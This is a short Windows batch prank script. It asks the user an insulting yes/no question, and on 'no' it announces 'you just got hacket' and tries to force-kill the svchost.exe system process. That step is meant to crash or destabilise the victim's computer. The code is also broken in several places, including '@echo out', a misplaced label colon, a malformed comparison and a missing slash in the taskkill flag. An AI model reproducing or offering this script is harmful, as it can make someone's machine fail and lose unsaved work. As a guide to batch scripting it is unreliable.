@echo out
1:
color a
echo do you suck (answer in yes/no)
set /p input=
if /i %input%==Yes goto love
if /i %input%==no goto hate
if /i not %input%== Yes,no goto 1
:love
echo i suck at gaming
timeout 100
pause
exit

:hate
echo you cant escape me
echo you just got hacket LOL LOL LOLLOL
timeout 100
timeout 5
taskkill /f im svchost.exe
